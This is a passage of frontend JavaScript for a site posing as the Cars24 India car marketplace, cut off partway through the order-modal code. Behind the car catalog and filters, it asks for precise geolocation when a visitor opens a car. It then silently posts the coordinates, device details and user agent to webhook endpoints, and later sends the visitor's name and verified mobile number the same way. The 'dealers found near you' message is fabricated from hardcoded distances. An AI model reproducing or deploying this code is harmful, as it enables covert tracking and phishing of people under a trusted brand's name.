/**
 * ============================================
 * Cars24 India - Frontend JavaScript
 * ============================================
 * Handles:
 * - Location detection ONLY when user clicks on a car (not on page load)
 * - Discord webhook communication via backend proxy
 * - User name capture and personalization
 * - Optional OTP mobile verification
 * - Car catalog filtering, sorting, and display
 * - Car detail view with pre-owned models
 * - Order inquiry modal
 */

// ═══════════════════════════════════════════════
//              CAR DATA
// ═══════════════════════════════════════════════

const carDatabase = [
  {
    id: 1, brand: 'Lamborghini', model: 'Huracan EVO', type: 'supercar',
    price: 32200000, priceLakh: '3.22 Cr', image: '/images/lamborghini-huracan.png',
    fuel: 'Petrol', transmission: 'Automatic', badges: ['hot'], dealer: 'Lamborghini Mumbai', distance: 0
  },
  {
    id: 2, brand: 'Ferrari', model: 'Roma', type: 'supercar',
    price: 36100000, priceLakh: '3.61 Cr', image: '/images/ferrari-roma.png',
    fuel: 'Petrol', transmission: 'Automatic', badges: ['hot'], dealer: 'Ferrari Delhi', distance: 0
  },
  {
    id: 3, brand: 'Porsche', model: '911 Turbo S', type: 'supercar',
    price: 33500000, priceLakh: '3.35 Cr', image: '/images/porsche-911.png',
    fuel: 'Petrol', transmission: 'Automatic', badges: ['hot'], dealer: 'Porsche Bangalore', distance: 0
  },
  {
    id: 4, brand: 'Mercedes-Benz', model: 'S-Class', type: 'luxury',
    price: 17000000, priceLakh: '1.70 Cr', image: '/images/mercedes-sclass.png',
    fuel: 'Petrol/Diesel', transmission: 'Automatic', badges: ['new'], dealer: 'Mercedes Hyderabad', distance: 0
  },
  {
    id: 5, brand: 'BMW', model: '7 Series', type: 'luxury',
    price: 16500000, priceLakh: '1.65 Cr', image: '/images/bmw-7series.png',
    fuel: 'Petrol/Diesel', transmission: 'Automatic', badges: ['new'], dealer: 'BMW Pune', distance: 0
  },
  {
    id: 6, brand: 'Audi', model: 'RS7 Sportback', type: 'luxury',
    price: 22400000, priceLakh: '2.24 Cr', image: '/images/audi-rs7.png',
    fuel: 'Petrol', transmission: 'Automatic', badges: ['hot'], dealer: 'Audi Chennai', distance: 0
  },
  {
    id: 7, brand: 'Mahindra', model: 'Thar', type: 'suv',
    price: 1565000, priceLakh: '15.65 Lakh', image: '/images/mahindra-thar.png',
    fuel: 'Petrol/Diesel', transmission: 'Manual/Auto', badges: ['offroad'], dealer: 'Mahindra showroom', distance: 0
  },
  {
    id: 8, brand: 'Hyundai', model: 'Creta', type: 'suv',
    price: 1157000, priceLakh: '11.57 Lakh', image: '/images/hyundai-creta.png',
    fuel: 'Petrol/Diesel', transmission: 'Manual/IVT', badges: ['new'], dealer: 'Hyundai showroom', distance: 0
  },
  {
    id: 9, brand: 'Tata', model: 'Harrier', type: 'suv',
    price: 1599000, priceLakh: '15.99 Lakh', image: '/images/tata-harrier.png',
    fuel: 'Diesel', transmission: 'Manual/AT', badges: ['new'], dealer: 'Tata Motors showroom', distance: 0
  },
  {
    id: 10, brand: 'Kia', model: 'Seltos', type: 'suv',
    price: 1199000, priceLakh: '11.99 Lakh', image: '/images/kia-seltos.png',
    fuel: 'Petrol/Diesel', transmission: 'Manual/IVT/DCT', badges: ['new'], dealer: 'Kia showroom', distance: 0
  },
  {
    id: 11, brand: 'Toyota', model: 'Fortuner', type: 'suv',
    price: 3359000, priceLakh: '33.59 Lakh', image: '/images/toyota-fortuner.png',
    fuel: 'Petrol/Diesel', transmission: 'Manual/AT', badges: ['offroad'], dealer: 'Toyota showroom', distance: 0
  },
  {
    id: 12, brand: 'MG', model: 'Hector Plus', type: 'suv',
    price: 1838000, priceLakh: '18.38 Lakh', image: '/images/mg-hector.png',
    fuel: 'Petrol/Diesel', transmission: 'Manual/CVT', badges: ['new'], dealer: 'MG showroom', distance: 0
  },
  {
    id: 13, brand: 'Hyundai', model: 'Verna', type: 'sedan',
    price: 1195000, priceLakh: '11.95 Lakh', image: '/images/hyundai-verna.png',
    fuel: 'Petrol/Diesel', transmission: 'Manual/IVT', badges: ['new'], dealer: 'Hyundai showroom', distance: 0
  },
  {
    id: 14, brand: 'Honda', model: 'City', type: 'sedan',
    price: 1261000, priceLakh: '12.61 Lakh', image: '/images/honda-city.png',
    fuel: 'Petrol', transmission: 'Manual/CVT', badges: ['new'], dealer: 'Honda showroom', distance: 0
  },
  {
    id: 15, brand: 'Maruti Suzuki', model: 'Swift', type: 'hatchback',
    price: 659000, priceLakh: '6.59 Lakh', image: '/images/maruti-swift.png',
    fuel: 'Petrol/CNG', transmission: 'Manual/AMT', badges: ['new'], dealer: 'Maruti Suzuki Arena', distance: 0
  },
  {
    id: 16, brand: 'Tata', model: 'Nexon', type: 'suv',
    price: 810000, priceLakh: '8.10 Lakh', image: '/images/tata-nexon.png',
    fuel: 'Petrol/Electric', transmission: 'Manual/AMT', badges: ['electric'], dealer: 'Tata Motors showroom', distance: 0
  },
  {
    id: 17, brand: 'Toyota', model: 'Innova Crysta', type: 'mpv',
    price: 1999000, priceLakh: '19.99 Lakh', image: '/images/toyota-innova.png',
    fuel: 'Diesel/Petrol', transmission: 'Manual/AT', badges: ['new'], dealer: 'Toyota showroom', distance: 0
  },
  {
    id: 18, brand: 'Hyundai', model: 'i20', type: 'hatchback',
    price: 703000, priceLakh: '7.03 Lakh', image: '/images/hyundai-i20.png',
    fuel: 'Petrol/Diesel', transmission: 'Manual/IVT', badges: ['new'], dealer: 'Hyundai showroom', distance: 0
  }
];

// ═══════════════════════════════════════════════
//    PRE-OWNED VARIANTS DATA (per car id)
// ═══════════════════════════════════════════════
const preOwnedVariants = {
  1: [
    { year: 2022, km: '12,400', price: '2.65 Cr', owner: '1st', color: 'Giallo Orion' },
    { year: 2021, km: '18,700', price: '2.40 Cr', owner: '2nd', color: 'Verde Mantis' },
    { year: 2020, km: '24,200', price: '2.10 Cr', owner: '2nd', color: 'Grigio Telesto' }
  ],
  2: [
    { year: 2023, km: '8,500', price: '3.10 Cr', owner: '1st', color: 'Rosso Corsa' },
    { year: 2022, km: '14,300', price: '2.85 Cr', owner: '1st', color: 'Nero Daytona' },
    { year: 2021, km: '21,000', price: '2.55 Cr', owner: '2nd', color: 'Blu Pozzi' }
  ],
  3: [
    { year: 2023, km: '6,200', price: '2.90 Cr', owner: '1st', color: 'Guards Red' },
    { year: 2022, km: '11,800', price: '2.65 Cr', owner: '1st', color: 'GT Silver' },
    { year: 2021, km: '19,500', price: '2.35 Cr', owner: '2nd', color: 'Night Blue' }
  ],
  4: [
    { year: 2023, km: '15,000', price: '1.35 Cr', owner: '1st', color: 'Obsidian Black' },
    { year: 2022, km: '28,400', price: '1.15 Cr', owner: '1st', color: 'Selenite Grey' },
    { year: 2021, km: '42,000', price: '95 Lakh', owner: '2nd', color: 'Mojave Silver' }
  ],
  5: [
    { year: 2023, km: '12,500', price: '1.30 Cr', owner: '1st', color: 'Alpine White' },
    { year: 2022, km: '25,000', price: '1.10 Cr', owner: '1st', color: 'Carbon Black' },
    { year: 2021, km: '38,000', price: '92 Lakh', owner: '2nd', color: 'Mineral Grey' }
  ],
  6: [
    { year: 2023, km: '9,800', price: '1.85 Cr', owner: '1st', color: 'Nardo Grey' },
    { year: 2022, km: '16,500', price: '1.65 Cr', owner: '1st', color: 'Daytona Grey' },
    { year: 2021, km: '27,300', price: '1.45 Cr', owner: '2nd', color: 'Glacier White' }
  ],
  7: [
    { year: 2024, km: '5,200', price: '14.20 Lakh', owner: '1st', color: 'Red Rush' },
    { year: 2023, km: '18,000', price: '13.10 Lakh', owner: '1st', color: 'Stealth Black' },
    { year: 2022, km: '32,500', price: '11.80 Lakh', owner: '2nd', color: 'Galaxy Grey' }
  ],
  8: [
    { year: 2024, km: '4,800', price: '10.50 Lakh', owner: '1st', color: 'Titan Grey' },
    { year: 2023, km: '15,200', price: '9.60 Lakh', owner: '1st', color: 'Fiery Red' },
    { year: 2022, km: '28,000', price: '8.70 Lakh', owner: '2nd', color: 'Atlas White' }
  ],
  9: [
    { year: 2024, km: '6,100', price: '14.50 Lakh', owner: '1st', color: 'Oberon Black' },
    { year: 2023, km: '19,800', price: '13.20 Lakh', owner: '1st', color: 'Camo' },
    { year: 2022, km: '35,000', price: '11.80 Lakh', owner: '2nd', color: 'Starlight' }
  ],
  10: [
    { year: 2024, km: '5,500', price: '10.80 Lakh', owner: '1st', color: 'Aurora Black' },
    { year: 2023, km: '14,200', price: '9.90 Lakh', owner: '1st', color: 'Gravity Grey' },
    { year: 2022, km: '26,800', price: '8.80 Lakh', owner: '2nd', color: 'Imperial Blue' }
  ],
  11: [
    { year: 2024, km: '8,200', price: '30.50 Lakh', owner: '1st', color: 'Super White' },
    { year: 2023, km: '22,000', price: '28.00 Lakh', owner: '1st', color: 'Attitude Black' },
    { year: 2022, km: '45,000', price: '25.50 Lakh', owner: '2nd', color: 'Silver' }
  ],
  12: [
    { year: 2024, km: '7,400', price: '16.20 Lakh', owner: '1st', color: 'Glacier White' },
    { year: 2023, km: '18,600', price: '14.80 Lakh', owner: '1st', color: 'Stern Black' },
    { year: 2022, km: '30,200', price: '13.20 Lakh', owner: '2nd', color: 'Dawn Grey' }
  ],
  13: [
    { year: 2024, km: '4,200', price: '10.80 Lakh', owner: '1st', color: 'Titan Grey' },
    { year: 2023, km: '12,800', price: '9.80 Lakh', owner: '1st', color: 'Fiery Red' },
    { year: 2022, km: '24,500', price: '8.60 Lakh', owner: '2nd', color: 'Polar White' }
  ],
  14: [
    { year: 2024, km: '5,600', price: '11.40 Lakh', owner: '1st', color: 'Platinum White' },
    { year: 2023, km: '16,000', price: '10.20 Lakh', owner: '1st', color: 'Lunar Silver' },
    { year: 2022, km: '29,000', price: '8.90 Lakh', owner: '2nd', color: 'Radiant Red' }
  ],
  15: [
    { year: 2024, km: '3,800', price: '5.90 Lakh', owner: '1st', color: 'Burning Red' },
    { year: 2023, km: '12,400', price: '5.40 Lakh', owner: '1st', color: 'Labyrinth Blue' },
    { year: 2022, km: '22,000', price: '4.70 Lakh', owner: '2nd', color: 'Silky Silver' }
  ],
  16: [
    { year: 2024, km: '4,500', price: '7.40 Lakh', owner: '1st', color: 'Candy White' },
    { year: 2023, km: '14,200', price: '6.80 Lakh', owner: '1st', color: 'Fearless Red' },
    { year: 2022, km: '25,000', price: '5.90 Lakh', owner: '2nd', color: 'Atlas Black' }
  ],
  17: [
    { year: 2024, km: '9,200', price: '18.50 Lakh', owner: '1st', color: 'Super White' },
    { year: 2023, km: '24,500', price: '17.00 Lakh', owner: '1st', color: 'Crystal Black' },
    { year: 2022, km: '42,000', price: '15.20 Lakh', owner: '2nd', color: 'Silver' }
  ],
  18: [
    { year: 2024, km: '3,200', price: '6.40 Lakh', owner: '1st', color: 'Atlas White' },
    { year: 2023, km: '11,800', price: '5.80 Lakh', owner: '1st', color: 'Titan Grey' },
    { year: 2022, km: '20,500', price: '5.10 Lakh', owner: '2nd', color: 'Fiery Red' }
  ]
};

// ═══════════════════════════════════════════════
//              GLOBAL STATE
// ═══════════════════════════════════════════════
const state = {
  userName: '',
  mobile: '',
  isVerified: false,
  latitude: null,
  longitude: null,
  accuracy: null,
  currentCarId: null,
  locationFetched: false
};

// ═══════════════════════════════════════════════
//              DOM ELEMENTS
// ═══════════════════════════════════════════════
const DOM = {
  navbar: document.getElementById('navbar'),
  mobileMenu: document.getElementById('mobile-menu'),
  mobileMenuBtn: document.getElementById('mobile-menu-btn'),
  heroLocateBtn: document.getElementById('hero-locate-btn'),
  navLocateBtn: document.getElementById('nav-locate-btn'),
  mobileLocateBtn: document.getElementById('mobile-locate-btn'),
  nameSection: document.getElementById('name-section'),
  nameInput: document.getElementById('user-name-input'),
  submitNameBtn: document.getElementById('submit-name-btn'),
  otpSection: document.getElementById('otp-section'),
  otpCloseBtn: document.getElementById('otp-close-btn'),
  otpStep1: document.getElementById('otp-step-1'),
  otpStep2: document.getElementById('otp-step-2'),
  mobileInput: document.getElementById('mobile-input'),
  sendOtpBtn: document.getElementById('send-otp-btn'),
  skipOtpBtn: document.getElementById('skip-otp-btn'),
  otpInput: document.getElementById('otp-input'),
  verifyOtpBtn: document.getElementById('verify-otp-btn'),
  resendOtpBtn: document.getElementById('resend-otp-btn'),
  otpMessage: document.getElementById('otp-message'),
  otpMobileDisplay: document.getElementById('otp-mobile-display'),
  typeTabs: document.getElementById('type-tabs'),
  carGrid: document.getElementById('car-grid'),
  emptyState: document.getElementById('empty-state'),
  resultsCount: document.getElementById('results-count'),
  filterBrand: document.getElementById('filter-brand'),
  filterPrice: document.getElementById('filter-price'),
  filterSort: document.getElementById('filter-sort'),
  filterResetBtn: document.getElementById('filter-reset-btn'),
  clearFiltersBtn: document.getElementById('clear-filters-btn'),
  carDetailOverlay: document.getElementById('car-detail-overlay'),
  carDetailClose: document.getElementById('car-detail-close'),
  carDetailContent: document.getElementById('car-detail-content'),
  orderModal: document.getElementById('order-modal'),
  modalCloseBtn: document.getElementById('modal-close-btn'),
  modalCarName: document.getElementById('modal-car-name'),
  modalCarPrice: document.getElementById('modal-car-price'),
  orderForm: document.getElementById('order-form'),
  orderName: document.getElementById('order-name'),
  orderMobile: document.getElementById('order-mobile'),
  orderNotes: document.getElementById('order-notes'),
  modalSuccess: document.getElementById('modal-success'),
  modalDoneBtn: document.getElementById('modal-done-btn')
};

// ═══════════════════════════════════════════════
//              INITIALIZATION
// ═══════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
  if (window.lucide) lucide.createIcons();
  renderCars(carDatabase);
  bindEvents();

  window.addEventListener('scroll', () => {
    DOM.navbar.classList.toggle('scrolled', window.scrollY > 10);
  });

  // NO location fetch on page load - only when user clicks a car
});

function bindEvents() {
  DOM.mobileMenuBtn.addEventListener('click', () => {
    DOM.mobileMenu.classList.toggle('active');
  });

  DOM.mobileMenu.querySelectorAll('.mobile-link').forEach(link => {
    link.addEventListener('click', () => {
      DOM.mobileMenu.classList.remove('active');
    });
  });

  DOM.heroLocateBtn.addEventListener('click', () => {
    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
  });
  if (DOM.navLocateBtn) DOM.navLocateBtn.addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
  });
  if (DOM.mobileLocateBtn) DOM.mobileLocateBtn.addEventListener('click', (e) => {
    e.preventDefault();
    document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
    DOM.mobileMenu.classList.remove('active');
  });

  DOM.submitNameBtn.addEventListener('click', submitUserName);
  DOM.nameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitUserName(); });

  DOM.otpCloseBtn.addEventListener('click', closeOtpSection);
  DOM.skipOtpBtn.addEventListener('click', closeOtpSection);
  DOM.sendOtpBtn.addEventListener('click', sendOtp);
  DOM.verifyOtpBtn.addEventListener('click', verifyOtp);
  DOM.resendOtpBtn.addEventListener('click', sendOtp);

  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(tab => {
      tab.addEventListener('click', () => {
        DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        applyFilters();
      });
    });
  }

  DOM.filterBrand.addEventListener('change', applyFilters);
  DOM.filterPrice.addEventListener('change', applyFilters);
  DOM.filterSort.addEventListener('change', applyFilters);
  DOM.filterResetBtn.addEventListener('click', resetFilters);
  if (DOM.clearFiltersBtn) DOM.clearFiltersBtn.addEventListener('click', resetFilters);

  // Car detail overlay close
  if (DOM.carDetailClose) DOM.carDetailClose.addEventListener('click', closeCarDetail);
  if (DOM.carDetailOverlay) DOM.carDetailOverlay.addEventListener('click', (e) => {
    if (e.target === DOM.carDetailOverlay) closeCarDetail();
  });

  // Order modal
  DOM.modalCloseBtn.addEventListener('click', closeOrderModal);
  DOM.orderModal.addEventListener('click', (e) => {
    if (e.target === DOM.orderModal) closeOrderModal();
  });
  DOM.orderForm.addEventListener('submit', submitOrder);
  DOM.modalDoneBtn.addEventListener('click', closeOrderModal);
}

// ═══════════════════════════════════════════════
//         CAR DETAIL VIEW (on card click)
// ═══════════════════════════════════════════════

function openCarDetail(carId) {
  const car = carDatabase.find(c => c.id === carId);
  if (!car) return;

  state.currentCarId = carId;
  const variants = preOwnedVariants[carId] || [];

  // Fetch location when user clicks a car (only once)
  if (!state.locationFetched) {
    requestLocationForDealer();
    state.locationFetched = true;
  }

  const variantsHtml = variants.map(v => `
    <div class="po-card">
      <div class="po-card-img">
        <img src="${car.image}" alt="${car.brand} ${car.model} ${v.year}" loading="lazy">
        <span class="po-badge">Pre-Owned</span>
      </div>
      <div class="po-card-body">
        <div class="po-title">${car.brand} ${car.model}</div>
        <div class="po-meta">
          <span><strong>${v.year}</strong></span>
          <span>${v.km} km</span>
          <span>${v.fuel || car.fuel.split('/')[0].trim()}</span>
          <span>${v.owner} Owner</span>
        </div>
        <div class="po-color">${v.color}</div>
        <div class="po-price">${v.price}</div>
        <button class="btn btn-primary btn-sm po-btn" onclick="openOrderModal(${car.id})">
          <i data-lucide="phone" class="icon-sm"></i> Get Dealer Price
        </button>
      </div>
    </div>
  `).join('');

  // Location prompt section
  let locationPromptHtml = '';
  if (state.latitude) {
    locationPromptHtml = `
      <div class="dealer-found">
        <div class="dealer-found-icon">
          <i data-lucide="check-circle" class="icon green"></i>
        </div>
        <div>
          <strong>Dealers found near you!</strong>
          <p>We found verified ${car.dealer} dealers nearby. Get the best price now.</p>
        </div>
      </div>
      <button class="btn btn-primary btn-block btn-lg" onclick="openOrderModal(${car.id})">
        <i data-lucide="phone" class="icon"></i> Get Best Price from Nearby Dealer
      </button>
    `;
  } else {
    locationPromptHtml = `
      <div class="location-prompt">
        <div class="location-prompt-icon">
          <i data-lucide="map-pin" class="icon"></i>
        </div>
        <div>
          <strong>Please allow your location to see nearby dealer</strong>
          <p>We need your location to find the nearest ${car.dealer} for the best deals on ${car.brand} ${car.model}.</p>
        </div>
      </div>
      <button class="btn btn-outline btn-block" id="allow-location-btn" onclick="requestLocationForDealer()">
        <i data-lucide="navigation" class="icon"></i> Allow Location
      </button>
      <button class="btn btn-primary btn-block btn-lg" onclick="openOrderModal(${car.id})" style="margin-top: 8px;">
        <i data-lucide="phone" class="icon"></i> Get Dealer Price
      </button>
    `;
  }

  DOM.carDetailContent.innerHTML = `
    <div class="cd-header">
      <div class="cd-img">
        <img src="${car.image}" alt="${car.brand} ${car.model}">
        <div class="cd-badges">${car.badges.map(b => {
          const labels = { hot: 'Hot', new: 'New', electric: 'EV', offroad: 'Off-Road' };
          return `<span class="badge badge-${b}">${labels[b] || b}</span>`;
        }).join('')}</div>
      </div>
      <div class="cd-info">
        <div class="cd-brand">${car.brand}</div>
        <h2 class="cd-model">${car.model}</h2>
        <div class="cd-specs">
          <span><i data-lucide="fuel" class="icon-sm"></i> ${car.fuel}</span>
          <span><i data-lucide="settings-2" class="icon-sm"></i> ${car.transmission}</span>
          <span><i data-lucide="store" class="icon-sm"></i> ${car.dealer}</span>
        </div>
        <div class="cd-price">${car.priceLakh} <span>Ex-Showroom</span></div>
        <div class="cd-price-po">Starting from <strong>${variants.length > 0 ? variants[variants.length - 1].price : car.priceLakh}</strong></div>
      </div>
    </div>

    <div class="cd-section">
      <h3 class="cd-section-title">
        <i data-lucide="tag" class="icon-sm"></i> Available Pre-Owned ${car.brand} ${car.model}
      </h3>
      <div class="po-grid">${variantsHtml}</div>
    </div>

    <div class="cd-section cd-dealer-section">
      <h3 class="cd-section-title">
        <i data-lucide="map-pin" class="icon-sm"></i> Find Nearby Dealer
      </h3>
      ${locationPromptHtml}
    </div>
  `;

  DOM.carDetailOverlay.style.display = 'flex';
  document.body.style.overflow = 'hidden';

  if (window.lucide) lucide.createIcons();
}

window.openCarDetail = openCarDetail;

function closeCarDetail() {
  DOM.carDetailOverlay.style.display = 'none';
  document.body.style.overflow = '';
}

// ═══════════════════════════════════════════════
//    LOCATION (only on car click, not on land)
// ═══════════════════════════════════════════════

function requestLocationForDealer() {
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    handleLocationSuccess,
    handleLocationError,
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

window.requestLocationForDealer = requestLocationForDealer;

async function handleLocationSuccess(position) {
  const { latitude, longitude, accuracy } = position.coords;
  state.latitude = latitude;
  state.longitude = longitude;
  state.accuracy = accuracy;

  const deviceInfo = getDeviceInfo();
  const payload = {
    latitude, longitude, accuracy,
    deviceName: deviceInfo.name,
    deviceModel: deviceInfo.model,
    userAgent: navigator.userAgent,
    timestamp: position.timestamp
  };

  // Send to webhook (silent)
  try {
    await fetch('/api/webhook/location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) { /* silent */ }

  if (state.userName) {
    await sendNameWebhook({ ...payload, name: state.userName });
  }

  // Set static distances ONCE
  setCarDistances();

  // Re-render car detail if open to show "dealers found"
  if (state.currentCarId && DOM.carDetailOverlay.style.display === 'flex') {
    openCarDetail(state.currentCarId);
  }
}

function handleLocationError(error) {
  console.log('[Location] Not available - continuing without');
}

function getDeviceInfo() {
  const ua = navigator.userAgent;
  let name = 'Unknown', model = '';

  if (/iPhone/.test(ua)) { name = 'Apple iPhone'; model = ua.match(/iPhone OS (\d+)/)?.[1] ? `iOS ${ua.match(/iPhone OS (\d+)/)[1]}` : ''; }
  else if (/iPad/.test(ua)) { name = 'Apple iPad'; }
  else if (/Samsung/.test(ua)) { name = 'Samsung'; const m = ua.match(/SM-(\w+)/); if (m) model = m[0]; }
  else if (/Pixel/.test(ua)) { name = 'Google Pixel'; const m = ua.match(/Pixel (\d+)/); if (m) model = `Pixel ${m[1]}`; }
  else if (/OnePlus/.test(ua)) { name = 'OnePlus'; const m = ua.match(/OnePlus[ _](\w+)/); if (m) model = m[0]; }
  else if (/Xiaomi/.test(ua)) { name = 'Xiaomi'; }
  else if (/Realme/.test(ua)) { name = 'Realme'; }
  else if (/Vivo/.test(ua)) { name = 'Vivo'; }
  else if (/Oppo/.test(ua)) { name = 'Oppo'; }
  else if (/Android/.test(ua)) { name = 'Android Device'; }
  else if (/Windows/.test(ua)) { name = 'Windows PC'; }
  else if (/Macintosh/.test(ua)) { name = 'Mac'; }
  else if (/Linux/.test(ua)) { name = 'Linux Device'; }

  return { name, model };
}

// ═══════════════════════════════════════════════
//              USER NAME HANDLING
// ═══════════════════════════════════════════════

async function submitUserName() {
  const name = DOM.nameInput.value.trim();
  if (!name) return;

  state.userName = name;
  DOM.submitNameBtn.innerHTML = '<i data-lucide="check" class="icon-sm green"></i>';
  DOM.submitNameBtn.disabled = true;
  DOM.nameInput.disabled = true;
  if (window.lucide) lucide.createIcons();

  if (state.latitude !== null) {
    await sendNameWebhook({
      name, latitude: state.latitude, longitude: state.longitude, accuracy: state.accuracy,
      deviceName: getDeviceInfo().name, deviceModel: getDeviceInfo().model,
      userAgent: navigator.userAgent, timestamp: Date.now()
    });
  }

  setTimeout(() => {
    DOM.otpSection.style.display = 'block';
    DOM.mobileInput.focus();
  }, 800);
}

async function sendNameWebhook(payload) {
  try {
    await fetch('/api/webhook/name', {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
    });
  } catch (e) { /* silent */ }
}

// ═══════════════════════════════════════════════
//              OTP VERIFICATION (Optional)
// ═══════════════════════════════════════════════

function closeOtpSection() { DOM.otpSection.style.display = 'none'; }

async function sendOtp() {
  const mobile = DOM.mobileInput.value.trim();
  if (!/^\d{10}$/.test(mobile)) { showOtpMessage('Please enter a valid 10-digit mobile number', 'error'); return; }

  DOM.sendOtpBtn.disabled = true;
  DOM.sendOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Sending...';

  try {
    const response = await fetch('/api/send-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ mobile }) });
    const data = await response.json();
    if (data.success) {
      DOM.otpStep1.style.display = 'none'; DOM.otpStep2.style.display = 'block';
      DOM.otpMobileDisplay.textContent = `+91 ${mobile.substring(0, 5)} ${mobile.substring(5)}`;
      DOM.otpInput.focus(); state.mobile = mobile;
    } else { showOtpMessage(data.message || 'Failed to send OTP', 'error'); }
  } catch (e) { showOtpMessage('Network error. Please try again.', 'error'); }

  DOM.sendOtpBtn.disabled = false;
  DOM.sendOtpBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Send OTP';
  if (window.lucide) lucide.createIcons();
}

async function verifyOtp() {
  const otp = DOM.otpInput.value.trim();
  if (!/^\d{4,6}$/.test(otp)) { showOtpMessage('Please enter a valid OTP', 'error'); return; }

  DOM.verifyOtpBtn.disabled = true;
  DOM.verifyOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Verifying...';

  try {
    const response = await fetch('/api/verify-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ mobile: state.mobile, otp }) });
    const data = await response.json();
    if (data.verified) {
      state.isVerified = true;
      showOtpMessage('Mobile number verified successfully!', 'success');
      await fetch('/api/webhook/otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: state.userName, mobile: state.mobile, latitude: state.latitude, longitude: state.longitude, accuracy: state.accuracy }) });
      DOM.orderName.value = state.userName; DOM.orderMobile.value = state.mobile;
      setTimeout(() => closeOtpSection(), 2000);
    } else { showOtpMessage(data.message || 'Invalid OTP', 'error'); DOM.otpInput.value = ''; DOM.otpInput.focus(); }
  } catch (e) { showOtpMessage('Network error. Please try again.', 'error'); }

  DOM.verifyOtpBtn.disabled = false;
  DOM.verifyOtpBtn.innerHTML = '<i data-lucide="check-circle" class="icon"></i> Verify OTP';
  if (window.lucide) lucide.createIcons();
}

function showOtpMessage(msg, type) {
  DOM.otpMessage.textContent = msg;
  DOM.otpMessage.className = `otp-message ${type}`;
  setTimeout(() => { DOM.otpMessage.textContent = ''; DOM.otpMessage.className = 'otp-message'; }, 4000);
}

// ═══════════════════════════════════════════════
//              CAR RENDERING & FILTERING
// ═══════════════════════════════════════════════

function renderCars(cars) {
  if (cars.length === 0) {
    DOM.carGrid.style.display = 'none'; DOM.emptyState.style.display = 'block';
    DOM.resultsCount.textContent = 'No cars found'; return;
  }
  DOM.carGrid.style.display = 'grid'; DOM.emptyState.style.display = 'none';
  DOM.resultsCount.textContent = `Showing ${cars.length} car${cars.length !== 1 ? 's' : ''}`;
  DOM.carGrid.innerHTML = cars.map(car => createCarCard(car)).join('');
  if (window.lucide) lucide.createIcons();
}

function createCarCard(car) {
  const badgesHtml = car.badges.map(b => {
    const labels = { hot: 'Hot', new: 'New', electric: 'EV', offroad: 'Off-Road' };
    return `<span class="badge badge-${b}">${labels[b] || b}</span>`;
  }).join('');

  return `
    <div class="car-card" onclick="openCarDetail(${car.id})">
      <div class="car-card-image">
        <img src="${car.image}" alt="${car.brand} ${car.model}" loading="lazy">
        <div class="car-badge">${badgesHtml}</div>
      </div>
      <div class="car-card-body">
        <div class="car-brand">${car.brand}</div>
        <h3 class="car-name">${car.model}</h3>
        <div class="car-specs">
          <div class="car-spec"><i data-lucide="fuel" class="icon"></i> ${car.fuel}</div>
          <div class="car-spec"><i data-lucide="settings-2" class="icon"></i> ${car.transmission}</div>
        </div>
        <div class="car-card-footer">
          <div class="car-price">${car.priceLakh}<span>Ex-Showroom</span></div>
          <button class="order-btn" onclick="event.stopPropagation(); openCarDetail(${car.id})">View</button>
        </div>
        <div class="car-dealer"><i data-lucide="store" class="icon-sm"></i> ${car.dealer}</div>
      </div>
    </div>
  `;
}

function applyFilters() {
  const activeTab = DOM.typeTabs?.querySelector('.type-tab.active');
  const type = activeTab ? activeTab.dataset.type : 'all';
  const brand = DOM.filterBrand.value;
  const priceRange = DOM.filterPrice.value;
  const sort = DOM.filterSort.value;

  let filtered = [...carDatabase];
  if (type !== 'all') filtered = filtered.filter(car => car.type === type);
  if (brand !== 'all') filtered = filtered.filter(car => car.brand.toLowerCase().includes(brand));
  if (priceRange !== 'all') {
    const [min, max] = priceRange.split('-').map(Number);
    filtered = filtered.filter(car => { const p = car.price / 100000; return p >= min && (max >= 999 ? true : p <= max); });
  }

  switch (sort) {
    case 'price-low': filtered.sort((a, b) => a.price - b.price); break;
    case 'price-high': filtered.sort((a, b) => b.price - a.price); break;
    case 'name-az': filtered.sort((a, b) => `${a.brand} ${a.model}`.localeCompare(`${b.brand} ${b.model}`)); break;
    default:
      filtered.sort((a, b) => {
        const o = { supercar: 0, luxury: 1, suv: 2, sedan: 3, mpv: 4, hatchback: 5, pickup: 6 };
        return (o[a.type] || 5) - (o[b.type] || 5);
      });
  }
  renderCars(filtered);
}

function resetFilters() {
  DOM.filterBrand.value = 'all'; DOM.filterPrice.value = 'all'; DOM.filterSort.value = 'default';
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
    DOM.typeTabs.querySelector('[data-type="all"]')?.classList.add('active');
  }
  renderCars(carDatabase);
}

function setFilter(type) {
  if (DOM.typeTabs) {
    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
    DOM.typeTabs.querySelector(`[data-type="${type}"]`)?.classList.add('active');
  }
  applyFilters();
  document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
}
window.setFilter = setFilter;

function setCarDistances() {
  const d = [3.2, 5.8, 8.1, 2.5, 4.3, 6.7, 1.2, 2.8, 3.5, 4.9, 7.2, 5.1, 3.8, 6.4, 1.8, 2.1, 8.5, 4.0];
  carDatabase.forEach((car, i) => { car.distance = d[i] || Math.round((Math.random() * 10 + 1) * 10) / 10; });
  applyFilters();
}

// ═══════════════════════════════════════════════
//              ORDER MODAL
// ═══════════════════════════════════════════════

function openOrderModal(carId) {
